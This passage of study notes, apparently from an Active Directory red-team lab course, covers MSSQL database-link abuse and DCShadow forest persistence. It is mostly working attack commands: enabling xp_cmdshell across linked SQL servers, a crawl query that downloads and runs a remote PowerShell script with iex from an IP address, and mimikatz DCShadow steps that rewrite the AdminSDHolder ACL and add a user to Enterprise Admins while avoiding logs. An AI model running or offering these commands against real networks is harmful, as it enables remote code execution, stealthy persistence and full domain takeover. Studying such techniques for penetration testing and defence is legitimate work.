* Access targeted service with same access as dcorp `ls \\eurocorp-dc.eurocorp.local\SharedwithDCorp\`

#### Trust Abuse - MSSQL Servers - DB Links
* Tools: *PowerUpSQL* and *HeidiSQL*
* Enumerate (Discover + Check Accessibility) `Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose`
* Gather Information `Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose`
* DB Links allow SQL Server to access external data sources (eg other servers, OLE DB sources such as csv files)
* DB Link -> possible to execute stored procedures on linked servers
* DB Links work across forest trusts
* Find DB Links to specified server `Get-SQLServerLink -Instance dcorp-mssql -Verbose` OR `select * from master..sysservers`
* `openquery()` to run query on linked DB eg `select * from openquery("dcorp-sql1",'select * from master..sysservers');` - can be nested to follow links to DB servers further along the chain
* `select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt",''select * from openquery("eu-sql.eu.eurocorp.local",''''select serverproperty(''''''''machinename''''''''), @@version;'''')'')');`
* Find links recursively: `Get-SQLServerLinkCrawl -Instance dcorp-mssql -Verbose`
* Command Execution:
  * on target, `xp_cmdshell` must be enabled
  * to enable: `EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT "eu-sql"`
  * `Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xpcmdshall 'whoami'"`
  * `Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'powershell iex (new-object net.webclient).downloadstring(''http://172.16.99.32/callme.ps1'') ' "`

#### Forest Persistence - DCShadow
* temporarily registers a new DC and uses it to push attributes (eg SID History, SPNs) on objects. *Leaves no logs for modified object*
* Need DA privileges by default
* attacker's machine must be part of root domain
* Need 2 mimikatz instances
  1. Start RPC servers with SYSTEM privileges and specify attributes to be modified: `!+` ; `!processtoken` ; `lsadump::dcshadow /object:root1user /attribute:Description /value="blah"` (eg set user SPN). This must run with SYSTEM privileges. Instead of `!+` etc, we can also start process with `psexec -s -i ` to run as SYSTEM
  2. Push the values (must have enough privileges (DA or otherwise)): `lsadump::dcshadow /push`
* Can set minimum req'd permissions with `Set-DCShadowPermissions` from *Nishang*. For example, to allow student32 to modify root32user from machine mcorp-student32: `Set-DCShadowPermissions -FakeDC mcorp-student1 -SAMAccountName root32user -Username student32`. Now mimikatz is not required to run as DA
* Modify the ACL of AdminSDHolder using DCShadow
  1. Get ACL `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=AdminSDHolder,CN=System,DC =moneycorp,DC=local")).psbase.ObjectSecurity.sddl`
  2. Copy the Full Control ACE for BA `(A;;CCDCLCSWRPWPLOCRSDRCWDWO;;;BA)`, substituting our user's SID for BA
  3. Append this to the original ACL, and write the new ACL to the properties. As SYSTEM: `lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<full ACL string>`. As DA or equivalent permissions: `lsadump::dcshadow /push`
  4. With this permission established, we can now add ourselves to desired groups to gain privileges when required, and tidy up to prevent detection `$user = Get-ADUser student32 -Server dcorp-dc.dollarcorp.moneycorp.local`; `$group = Get-ADGroup -Identity "enterprise admins"`;  `Add-ADGroupMember -Identity $group -Members $user`. Once in the `Enterprise Admins` and `Administrators` groups, we get full access to domain resources. *(Note: To access child domain resources, may have to rejoin machine to child domain and reboot)*


